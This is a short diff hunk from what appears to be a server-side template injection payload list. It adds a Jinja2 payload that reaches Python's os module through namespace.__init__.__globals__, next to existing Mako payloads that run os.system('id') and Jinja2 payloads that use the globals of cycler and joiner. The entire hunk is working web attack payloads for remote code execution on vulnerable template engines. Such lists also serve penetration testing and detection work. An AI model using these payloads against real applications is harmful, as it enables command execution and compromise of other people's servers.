@@ -102,3 +102,4 @@ ${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
 ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 {{self._TemplateReference__context.cycler.__init__.__globals__.os}}
 {{self._TemplateReference__context.joiner.__init__.__globals__.os}}
+{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
